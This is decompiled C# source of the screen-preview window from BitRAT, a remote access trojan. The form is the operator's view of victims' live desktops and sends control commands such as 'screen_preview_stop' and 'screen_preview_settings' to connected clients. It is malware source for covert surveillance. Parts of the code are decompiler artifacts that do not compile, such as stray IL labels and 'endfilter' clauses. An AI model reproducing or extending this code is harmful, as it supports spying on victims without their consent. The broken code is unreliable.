﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using BitRAT;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Zeroit.Framework.Progress;

// Token: 0x020000D8 RID: 216
[DesignerGenerated]
public sealed partial class fPreview : Form
{
	// Token: 0x06000A3B RID: 2619 RVA: 0x000515C8 File Offset: 0x0004F7C8
	public fPreview()
	{
		base.Load += this.fPreview_Load;
		base.Resize += this.fPreview_Resize;
		base.VisibleChanged += this.fPreview_VisibleChanged;
		this.bool_0 = false;
		this.InitializeComponent();
	}

	// Token: 0x06000A3E RID: 2622 RVA: 0x00006CB8 File Offset: 0x00004EB8
	internal PictureBox vmethod_0()
	{
		return this.pictureBox_0;
	}

	// Token: 0x06000A3F RID: 2623 RVA: 0x00051A84 File Offset: 0x0004FC84
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_1(PictureBox pictureBox_1)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_10);
		MouseEventHandler value2 = new MouseEventHandler(this.method_11);
		EventHandler value3 = new EventHandler(this.method_15);
		EventHandler value4 = new EventHandler(this.method_19);
		PictureBox pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.MouseDown -= value;
			pictureBox.MouseUp -= value2;
			pictureBox.DoubleClick -= value3;
			pictureBox.Click -= value4;
		}
		this.pictureBox_0 = pictureBox_1;
		pictureBox = this.pictureBox_0;
		if (pictureBox != null)
		{
			pictureBox.MouseDown += value;
			pictureBox.MouseUp += value2;
			pictureBox.DoubleClick += value3;
			pictureBox.Click += value4;
		}
	}

	// Token: 0x06000A40 RID: 2624 RVA: 0x00006CC0 File Offset: 0x00004EC0
	internal System.Windows.Forms.Timer vmethod_2()
	{
		return this.timer_0;
	}

	// Token: 0x06000A41 RID: 2625 RVA: 0x00051B1C File Offset: 0x0004FD1C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_3(System.Windows.Forms.Timer timer_5)
	{
		EventHandler value = new EventHandler(this.method_4);
		System.Windows.Forms.Timer timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_0 = timer_5;
		timer = this.timer_0;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000A42 RID: 2626 RVA: 0x00006CC8 File Offset: 0x00004EC8
	internal System.Windows.Forms.Timer vmethod_4()
	{
		return this.timer_1;
	}

	// Token: 0x06000A43 RID: 2627 RVA: 0x00051B60 File Offset: 0x0004FD60
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_5(System.Windows.Forms.Timer timer_5)
	{
		EventHandler value = new EventHandler(this.method_5);
		System.Windows.Forms.Timer timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_1 = timer_5;
		timer = this.timer_1;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000A44 RID: 2628 RVA: 0x00006CD0 File Offset: 0x00004ED0
	internal System.Windows.Forms.Timer vmethod_6()
	{
		return this.timer_2;
	}

	// Token: 0x06000A45 RID: 2629 RVA: 0x00051BA4 File Offset: 0x0004FDA4
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_7(System.Windows.Forms.Timer timer_5)
	{
		EventHandler value = new EventHandler(this.method_8);
		System.Windows.Forms.Timer timer = this.timer_2;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_2 = timer_5;
		timer = this.timer_2;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000A46 RID: 2630 RVA: 0x00006CD8 File Offset: 0x00004ED8
	internal Label vmethod_8()
	{
		return this.label_0;
	}

	// Token: 0x06000A47 RID: 2631 RVA: 0x00051BE8 File Offset: 0x0004FDE8
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_9(Label label_2)
	{
		MouseEventHandler value = new MouseEventHandler(this.method_12);
		MouseEventHandler value2 = new MouseEventHandler(this.method_13);
		Label label = this.label_0;
		if (label != null)
		{
			label.MouseDown -= value;
			label.MouseUp -= value2;
		}
		this.label_0 = label_2;
		label = this.label_0;
		if (label != null)
		{
			label.MouseDown += value;
			label.MouseUp += value2;
		}
	}

	// Token: 0x06000A48 RID: 2632 RVA: 0x00006CE0 File Offset: 0x00004EE0
	internal System.Windows.Forms.Timer vmethod_10()
	{
		return this.timer_3;
	}

	// Token: 0x06000A49 RID: 2633 RVA: 0x00051C48 File Offset: 0x0004FE48
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_11(System.Windows.Forms.Timer timer_5)
	{
		EventHandler value = new EventHandler(this.method_14);
		System.Windows.Forms.Timer timer = this.timer_3;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_3 = timer_5;
		timer = this.timer_3;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000A4A RID: 2634 RVA: 0x00006CE8 File Offset: 0x00004EE8
	internal ZeroitWin8ProgressRing vmethod_12()
	{
		return this.zeroitWin8ProgressRing_0;
	}

	// Token: 0x06000A4B RID: 2635 RVA: 0x00006CF0 File Offset: 0x00004EF0
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_13(ZeroitWin8ProgressRing zeroitWin8ProgressRing_1)
	{
		this.zeroitWin8ProgressRing_0 = zeroitWin8ProgressRing_1;
	}

	// Token: 0x06000A4C RID: 2636 RVA: 0x00006CF9 File Offset: 0x00004EF9
	internal Label vmethod_14()
	{
		return this.label_1;
	}

	// Token: 0x06000A4D RID: 2637 RVA: 0x00006D01 File Offset: 0x00004F01
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_15(Label label_2)
	{
		this.label_1 = label_2;
	}

	// Token: 0x06000A4E RID: 2638 RVA: 0x00006D0A File Offset: 0x00004F0A
	internal System.Windows.Forms.Timer vmethod_16()
	{
		return this.timer_4;
	}

	// Token: 0x06000A4F RID: 2639 RVA: 0x00051C8C File Offset: 0x0004FE8C
	[MethodImpl(MethodImplOptions.Synchronized)]
	internal void vmethod_17(System.Windows.Forms.Timer timer_5)
	{
		EventHandler value = new EventHandler(this.method_20);
		System.Windows.Forms.Timer timer = this.timer_4;
		if (timer != null)
		{
			timer.Tick -= value;
		}
		this.timer_4 = timer_5;
		timer = this.timer_4;
		if (timer != null)
		{
			timer.Tick += value;
		}
	}

	// Token: 0x06000A50 RID: 2640 RVA: 0x00051CD0 File Offset: 0x0004FED0
	private void fPreview_Load(object sender, EventArgs e)
	{
		base.Visible = false;
		checked
		{
			base.Width = (int)Math.Round(Conversion.Val(Class130.fSettings_0.vmethod_92().Text));
			base.Height = (int)Math.Round(Conversion.Val(Class130.fSettings_0.vmethod_86().Text));
			this.vmethod_12().Animate = false;
			this.vmethod_8().Text = string.Concat(new string[]
			{
				this.string_2,
				"^",
				this.string_3,
				" - ",
				this.string_5
			});
			this.method_7();
		}
	}

	// Token: 0x06000A51 RID: 2641 RVA: 0x00051D78 File Offset: 0x0004FF78
	private void method_0()
	{
		checked
		{
			this.vmethod_12().Left = (int)Math.Round(unchecked((double)base.Width / 2.0 - (double)this.vmethod_12().Width / 2.0));
			this.vmethod_12().Top = (int)Math.Round(unchecked((double)base.Height / 2.0 - (double)this.vmethod_12().Height / 2.0));
			this.vmethod_12().Animate = true;
			Point position = Cursor.Position;
			base.Left = (int)Math.Round(unchecked((double)position.X - (double)base.Width / 2.0));
			base.Top = (int)Math.Round(unchecked((double)position.Y - (double)base.Height / 2.0));
		}
	}

	// Token: 0x06000A52 RID: 2642 RVA: 0x00051E58 File Offset: 0x00050058
	private void method_1()
	{
		Point position = Cursor.Position;
		checked
		{
			base.Left = (int)(unchecked((long)position.X) - this.long_0);
			base.Top = (int)(unchecked((long)position.Y) - this.long_1);
		}
	}

	// Token: 0x06000A53 RID: 2643 RVA: 0x00006D12 File Offset: 0x00004F12
	private void method_2()
	{
		this.point_0 = Cursor.Position;
		this.long_0 = (long)(checked(this.point_0.X - base.Left));
		this.long_1 = (long)(checked(this.point_0.Y - base.Top));
	}

	// Token: 0x06000A54 RID: 2644 RVA: 0x00051E98 File Offset: 0x00050098
	public void method_3(string string_6, string string_7, string string_8, string string_9, string string_10)
	{
		this.string_2 = string_6;
		this.string_4 = string_7;
		this.string_3 = string_8;
		this.string_5 = string_9;
		this.string_0 = string_10;
		this.vmethod_8().Text = string.Concat(new string[]
		{
			string_6,
			"^",
			string_8,
			" - ",
			string_9
		});
	}

	// Token: 0x06000A55 RID: 2645 RVA: 0x00051F00 File Offset: 0x00050100
	private void method_4(object sender, EventArgs e)
	{
		if (Class135.smethod_0().PreviewTransparentFrames)
		{
			if (Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_2().Tag)) == 80.0)
			{
				base.Opacity = 80.0;
				base.Visible = true;
				this.vmethod_2().Tag = "0";
			}
			this.vmethod_2().Tag = Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_2().Tag)) + 10.0;
			base.Opacity = Conversion.Val(Operators.DivideObject(this.vmethod_2().Tag, 100));
			this.Refresh();
			if (Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_2().Tag)) == 80.0)
			{
				this.vmethod_2().Enabled = false;
				return;
			}
		}
		else
		{
			base.Opacity = 100.0;
			base.Visible = true;
			this.Refresh();
			this.vmethod_2().Tag = "0";
			this.vmethod_2().Enabled = false;
		}
	}

	// Token: 0x06000A56 RID: 2646 RVA: 0x00052020 File Offset: 0x00050220
	private void method_5(object sender, EventArgs e)
	{
		if (Class135.smethod_0().PreviewTransparentFrames)
		{
			if (Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_4().Tag)) == 0.0)
			{
				this.vmethod_4().Tag = "80";
				base.Opacity = 80.0;
				base.Visible = true;
			}
			this.vmethod_4().Tag = Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_4().Tag)) - 10.0;
			base.Opacity = Conversion.Val(Operators.DivideObject(this.vmethod_4().Tag, 100));
			this.Refresh();
			if (Conversion.Val(RuntimeHelpers.GetObjectValue(this.vmethod_4().Tag)) == 0.0)
			{
				base.Visible = false;
				this.vmethod_4().Enabled = false;
				return;
			}
		}
		else
		{
			base.Opacity = 0.0;
			this.Refresh();
			this.vmethod_4().Tag = 0;
			base.Visible = false;
			this.vmethod_4().Enabled = false;
		}
	}

	// Token: 0x06000A57 RID: 2647 RVA: 0x00052148 File Offset: 0x00050348
	public void method_6()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fPreview.Delegate45(this.method_6), new object[0]);
			return;
		}
		if (Operators.CompareString(this.string_1, null, true) != 0 && Class130.concurrentDictionary_3.ContainsKey(this.string_1))
		{
			CClient cclient = Class130.concurrentDictionary_3[this.string_1];
			bool flag = true;
			cclient.SOCKET_DISCONNECT(ref flag);
		}
	}

	// Token: 0x06000A58 RID: 2648 RVA: 0x00006D51 File Offset: 0x00004F51
	public void method_7()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fPreview.Delegate46(this.method_7), new object[0]);
			return;
		}
		this.method_0();
		this.vmethod_2().Enabled = true;
	}

	// Token: 0x06000A59 RID: 2649 RVA: 0x00006D87 File Offset: 0x00004F87
	private void method_8(object sender, EventArgs e)
	{
		this.method_1();
	}

	// Token: 0x06000A5A RID: 2650 RVA: 0x00006D8F File Offset: 0x00004F8F
	public void method_9()
	{
		if (base.InvokeRequired)
		{
			base.Invoke(new fPreview.Delegate48(this.method_9), new object[0]);
			return;
		}
		this.vmethod_4().Enabled = true;
	}

	// Token: 0x06000A5B RID: 2651 RVA: 0x000521B4 File Offset: 0x000503B4
	private void method_10(object sender, MouseEventArgs e)
	{
		this.method_2();
		MouseButtons button = e.Button;
		if (button == MouseButtons.Left)
		{
			this.vmethod_6().Enabled = true;
			return;
		}
		if (button != MouseButtons.Right)
		{
			return;
		}
		if (Class130.concurrentDictionary_3.ContainsKey(this.string_0))
		{
			CClient cclient = Class130.concurrentDictionary_3[this.string_0];
			bool flag = true;
			CClient cclient2 = cclient;
			try
			{
				if (cclient2.fPr != null && cclient2.fPr.Visible)
				{
					if (flag)
					{
						cclient2.fPr.method_6();
					}
					string sKey = cclient2.sKey;
					string text = "screen_preview_stop|1";
					string text2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text2;
					@class.string_1 = text;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
					cclient2.fPr.vmethod_8().ForeColor = Color.Red;
					cclient2.fPr.vmethod_14().Text = "Disconnected";
					cclient2.fPr.vmethod_14().ForeColor = Color.Red;
				}
				cclient2.PREVIEW_SCREEN_IS_ENABLED = false;
			}
			catch (Exception ex2)
			{
			}
		}
		this.method_9();
	}

	// Token: 0x06000A5C RID: 2652 RVA: 0x00052328 File Offset: 0x00050528
	private void method_11(object sender, MouseEventArgs e)
	{
		MouseButtons button = e.Button;
		if (button == MouseButtons.Left)
		{
			this.vmethod_6().Enabled = false;
		}
	}

	// Token: 0x06000A5D RID: 2653 RVA: 0x000521B4 File Offset: 0x000503B4
	private void method_12(object sender, MouseEventArgs e)
	{
		this.method_2();
		MouseButtons button = e.Button;
		if (button == MouseButtons.Left)
		{
			this.vmethod_6().Enabled = true;
			return;
		}
		if (button != MouseButtons.Right)
		{
			return;
		}
		if (Class130.concurrentDictionary_3.ContainsKey(this.string_0))
		{
			CClient cclient = Class130.concurrentDictionary_3[this.string_0];
			bool flag = true;
			CClient cclient2 = cclient;
			try
			{
				if (cclient2.fPr != null && cclient2.fPr.Visible)
				{
					if (flag)
					{
						cclient2.fPr.method_6();
					}
					string sKey = cclient2.sKey;
					string text = "screen_preview_stop|1";
					string text2 = sKey;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text2;
					@class.string_1 = text;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
					cclient2.fPr.vmethod_8().ForeColor = Color.Red;
					cclient2.fPr.vmethod_14().Text = "Disconnected";
					cclient2.fPr.vmethod_14().ForeColor = Color.Red;
				}
				cclient2.PREVIEW_SCREEN_IS_ENABLED = false;
			}
			catch (Exception ex2)
			{
			}
		}
		this.method_9();
	}

	// Token: 0x06000A5E RID: 2654 RVA: 0x00052328 File Offset: 0x00050528
	private void method_13(object sender, MouseEventArgs e)
	{
		MouseButtons button = e.Button;
		if (button == MouseButtons.Left)
		{
			this.vmethod_6().Enabled = false;
		}
	}

	// Token: 0x06000A5F RID: 2655 RVA: 0x00052350 File Offset: 0x00050550
	private void method_14(object sender, EventArgs e)
	{
		checked
		{
			if (!this.bool_0)
			{
				base.Width += 8;
				base.Height = (int)Math.Round(unchecked((double)base.Height + (double)Class135.smethod_0().PreviewDoubleClickY / (double)Class135.smethod_0().PreviewDoubleClickX * 8.0));
				if (base.Width >= Class135.smethod_0().PreviewDoubleClickX)
				{
					base.Width = Class135.smethod_0().PreviewDoubleClickX;
					base.Height = Class135.smethod_0().PreviewDoubleClickY;
					this.bool_0 = true;
					string text = this.string_0;
					string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
					{
						"screen_preview_settings|",
						Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
						"|",
						Conversions.ToString(Class135.smethod_0().PreviewQuality),
						"|"
					}), Interaction.IIf(this.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)), "|"), base.Width), "|"), base.Height));
					string text3 = text;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex)
					{
					}
					this.vmethod_10().Enabled = false;
					return;
				}
			}
			else
			{
				base.Width -= 8;
				base.Height = (int)Math.Round(unchecked((double)base.Height - (double)Class135.smethod_0().PreviewDefaultY / (double)Class135.smethod_0().PreviewDefaultX * 8.0));
				if (base.Width <= Class135.smethod_0().PreviewDefaultX)
				{
					base.Width = Class135.smethod_0().PreviewDefaultX;
					base.Height = Class135.smethod_0().PreviewDefaultY;
					this.bool_0 = false;
					string text4 = this.string_0;
					string text2 = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(string.Concat(new string[]
					{
						"screen_preview_settings|",
						Conversions.ToString(Class135.smethod_0().PreviewUpdateInterval),
						"|",
						Conversions.ToString(Class135.smethod_0().PreviewQuality),
						"|"
					}), Interaction.IIf(this.bool_0, Class135.smethod_0().PreviewDoubleClickSize, Class135.smethod_0().PreviewDefaultSize)), "|"), base.Width), "|"), base.Height));
					string text3 = text4;
					Class136.Class138 @class = new Class136.Class138();
					@class.string_0 = text3;
					@class.string_1 = text2;
					@class.long_0 = 0L;
					try
					{
						if (Class130.concurrentDictionary_3.ContainsKey(@class.string_0))
						{
							new Thread(new ThreadStart(@class._Lambda$__0)).Start();
						}
					}
					catch (Exception ex2)
					{
					}
					this.vmethod_10().Enabled = false;
				}
			}
		}
	}

	// Token: 0x06000A60 RID: 2656 RVA: 0x00006DBF File Offset: 0x00004FBF
	private void method_15(object sender, EventArgs e)
	{
		this.vmethod_10().Enabled = true;
	}

	// Token: 0x06000A61 RID: 2657 RVA: 0x000526C0 File Offset: 0x000508C0
	private void fPreview_Resize(object sender, EventArgs e)
	{
		this.vmethod_0().Left = 0;
		checked
		{
			this.vmethod_0().Top = this.vmethod_8().Top + this.vmethod_8().Height;
			this.vmethod_0().Width = base.Width;
			this.vmethod_0().Height = Conversions.ToInteger(Operators.SubtractObject(base.Height - this.vmethod_8().Height, Interaction.IIf(this.vmethod_14().Visible, this.vmethod_14().Height, 0)));
			this.vmethod_12().Left = (int)Math.Round(unchecked((double)base.Width / 2.0 - (double)this.vmethod_12().Width / 2.0));
			this.vmethod_12().Top = (int)Math.Round(unchecked((double)base.Height / 2.0 - (double)this.vmethod_12().Height / 2.0));
			this.vmethod_12().Animate = true;
			this.vmethod_8().Width = base.Width;
			this.vmethod_14().Width = base.Width - 20;
		}
	}

	// Token: 0x06000A62 RID: 2658 RVA: 0x00052804 File Offset: 0x00050A04
	public void method_16()
	{
		this.vmethod_0().Image = null;
		this.vmethod_0().BackColor = Color.Empty;
		this.vmethod_0().Invalidate();
		if (this.vmethod_12().InvokeRequired)
		{
			this.vmethod_12().Invoke(new fPreview.Delegate43(this.method_16), new object[0]);
			return;
		}
		this.vmethod_12().Animate = true;
		this.vmethod_12().Visible = true;
	}

	// Token: 0x06000A63 RID: 2659 RVA: 0x0005287C File Offset: 0x00050A7C
	public void method_17()
	{
		if (this.vmethod_12().InvokeRequired)
		{
			this.vmethod_12().Invoke(new fPreview.Delegate47(this.method_17), new object[0]);
			return;
		}
		this.vmethod_12().Animate = false;
		this.vmethod_12().Visible = false;
	}

	// Token: 0x06000A64 RID: 2660 RVA: 0x000528D0 File Offset: 0x00050AD0
	public void method_18(long long_2, double double_0, double double_1)
	{
		if (this.vmethod_14().InvokeRequired)
		{
			this.vmethod_14().Invoke(new fPreview.Delegate49(this.method_18), new object[]
			{
				long_2,
				double_0,
				double_1
			});
			return;
		}
		this.vmethod_14().Visible = true;
		Label label = this.vmethod_14();
		string[] array = new string[7];
		array[0] = "FPS: ";
		array[1] = Conversions.ToString(long_2);
		array[2] = " (";
		int num = 3;
		bool flag = false;
		ref bool ptr = ref flag;
		int num2 = num;
		string[] array2 = array;
		string[] array3 = array;
		Label label2 = label;
		int num3;
		string text2;
		int num4;
		object obj;
		try
		{
			ProjectData.ClearProjectError();
			num3 = 2;
			string text = string.Empty;
			if (double_1 >= 1099511627776.0)
			{
				text = Strings.Format(double_1 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
			}
			else if (double_1 >= 1073741824.0)
			{
				text = Strings.Format(double_1 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
			}
			else if (double_1 >= 1048576.0)
			{
				text = Strings.Format(double_1 / 1024.0 / 1024.0, "#0.00") + " MiB";
			}
			else if (double_1 >= 1024.0)
			{
				text = Strings.Format(double_1 / 1024.0, "#0.00") + " KiB";
			}
			else if (double_1 < 1024.0)
			{
				text = Conversions.ToString(Conversion.Fix(double_1)) + " B";
			}
			if (ptr)
			{
				text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
			}
			if (text.Length > 0)
			{
				text2 = text;
			}
			else
			{
				text2 = " 0 B";
			}
			IL_1F8:
			goto IL_247;
			IL_1FA:
			text2 = "0 B";
			goto IL_1F8;
			IL_202:
			num4 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_218:;
		}
		catch when (endfilter(obj is Exception & num3 != 0 & num4 == 0))
		{
			Exception ex = (Exception)obj2;
			goto IL_202;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_247:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		string text3 = text2;
		Label label3 = label2;
		string[] array4 = array3;
		array2[num2] = text3;
		array4[4] = "/s @ ";
		int num5 = 5;
		double num6 = double_1 / (double)long_2;
		flag = false;
		ptr = ref flag;
		double num7 = num6;
		int num8 = num5;
		string[] array5 = array4;
		string[] array6 = array4;
		Label label4 = label3;
		object obj3;
		try
		{
			ProjectData.ClearProjectError();
			num3 = 2;
			string text = string.Empty;
			if (num7 >= 1099511627776.0)
			{
				text = Strings.Format(num7 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
			}
			else if (num7 >= 1073741824.0)
			{
				text = Strings.Format(num7 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
			}
			else if (num7 >= 1048576.0)
			{
				text = Strings.Format(num7 / 1024.0 / 1024.0, "#0.00") + " MiB";
			}
			else if (num7 >= 1024.0)
			{
				text = Strings.Format(num7 / 1024.0, "#0.00") + " KiB";
			}
			else if (num7 < 1024.0)
			{
				text = Conversions.ToString(Conversion.Fix(num7)) + " B";
			}
			if (ptr)
			{
				text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
			}
			if (text.Length > 0)
			{
				text2 = text;
			}
			else
			{
				text2 = " 0 B";
			}
			IL_3E9:
			goto IL_438;
			IL_3EB:
			text2 = "0 B";
			goto IL_3E9;
			IL_3F3:
			num4 = -1;
			@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
			IL_409:;
		}
		catch when (endfilter(obj3 is Exception & num3 != 0 & num4 == 0))
		{
			Exception ex2 = (Exception)obj4;
			goto IL_3F3;
		}
		throw ProjectData.CreateProjectError(-2146828237);
		IL_438:
		if (num4 != 0)
		{
			ProjectData.ClearProjectError();
		}
		string text4 = text2;
		Label label5 = label4;
		string[] array7 = array6;
		array5[num8] = text4;
		array7[6] = "/frame)";
		label5.Text = string.Concat(array7);
	}

	// Token: 0x06000A65 RID: 2661 RVA: 0x00002F44 File Offset: 0x00001144
	private void method_19(object sender, EventArgs e)
	{
	}

	// Token: 0x06000A66 RID: 2662 RVA: 0x00052D74 File Offset: 0x00050F74
	private void method_20(object sender, EventArgs e)
	{
		this.vmethod_0().Left = 0;
		checked
		{
			this.vmethod_0().Top = this.vmethod_8().Top + this.vmethod_8().Height;
			this.vmethod_0().Width = base.Width;
			this.vmethod_0().Height = Conversions.ToInteger(Operators.SubtractObject(base.Height - this.vmethod_8().Height, Interaction.IIf(this.vmethod_14().Visible, this.vmethod_14().Height, 0)));
		}
	}

	// Token: 0x06000A67 RID: 2663 RVA: 0x00006DCD File Offset: 0x00004FCD
	public void method_21()
	{
		if (this.vmethod_14().InvokeRequired)
		{
			this.vmethod_14().Invoke(new fPreview.Delegate44(this.method_21), new object[0]);
			return;
		}
		this.vmethod_14().Visible = false;
	}

	// Token: 0x06000A68 RID: 2664 RVA: 0x00052D74 File Offset: 0x00050F74
	private void fPreview_VisibleChanged(object sender, EventArgs e)
	{
		this.vmethod_0().Left = 0;
		checked
		{
			this.vmethod_0().Top = this.vmethod_8().Top + this.vmethod_8().Height;
			this.vmethod_0().Width = base.Width;
			this.vmethod_0().Height = Conversions.ToInteger(Operators.SubtractObject(base.Height - this.vmethod_8().Height, Interaction.IIf(this.vmethod_14().Visible, this.vmethod_14().Height, 0)));
		}
	}

	// Token: 0x040003E8 RID: 1000
	private PictureBox pictureBox_0;

	// Token: 0x040003E9 RID: 1001
	private System.Windows.Forms.Timer timer_0;

	// Token: 0x040003EA RID: 1002
	private System.Windows.Forms.Timer timer_1;

	// Token: 0x040003EB RID: 1003
	private System.Windows.Forms.Timer timer_2;

	// Token: 0x040003EC RID: 1004
	private Label label_0;

	// Token: 0x040003ED RID: 1005
	private System.Windows.Forms.Timer timer_3;

	// Token: 0x040003EE RID: 1006
	private ZeroitWin8ProgressRing zeroitWin8ProgressRing_0;

	// Token: 0x040003EF RID: 1007
	private Label label_1;

	// Token: 0x040003F0 RID: 1008
	private System.Windows.Forms.Timer timer_4;

	// Token: 0x040003F1 RID: 1009
	public string string_0;

	// Token: 0x040003F2 RID: 1010
	public string string_1;

	// Token: 0x040003F3 RID: 1011
	public string string_2;

	// Token: 0x040003F4 RID: 1012
	public string string_3;

	// Token: 0x040003F5 RID: 1013
	public string string_4;

	// Token: 0x040003F6 RID: 1014
	public string string_5;

	// Token: 0x040003F7 RID: 1015
	public Point point_0;

	// Token: 0x040003F8 RID: 1016
	private long long_0;

	// Token: 0x040003F9 RID: 1017
	private long long_1;

	// Token: 0x040003FA RID: 1018
	public bool bool_0;

	// Token: 0x020000D9 RID: 217
	// (Invoke) Token: 0x06000A6C RID: 2668
	private delegate void Delegate43();

	// Token: 0x020000DA RID: 218
	// (Invoke) Token: 0x06000A70 RID: 2672
	private delegate void Delegate44();

	// Token: 0x020000DB RID: 219
	// (Invoke) Token: 0x06000A74 RID: 2676
	private delegate void Delegate45();

	// Token: 0x020000DC RID: 220
	// (Invoke) Token: 0x06000A78 RID: 2680
	private delegate void Delegate46();

	// Token: 0x020000DD RID: 221
	// (Invoke) Token: 0x06000A7C RID: 2684
	private delegate void Delegate47();

	// Token: 0x020000DE RID: 222
	// (Invoke) Token: 0x06000A80 RID: 2688
	private delegate void Delegate48();

	// Token: 0x020000DF RID: 223
	// (Invoke) Token: 0x06000A84 RID: 2692
	private delegate void Delegate49(long long_0, double double_0, double double_1);
}
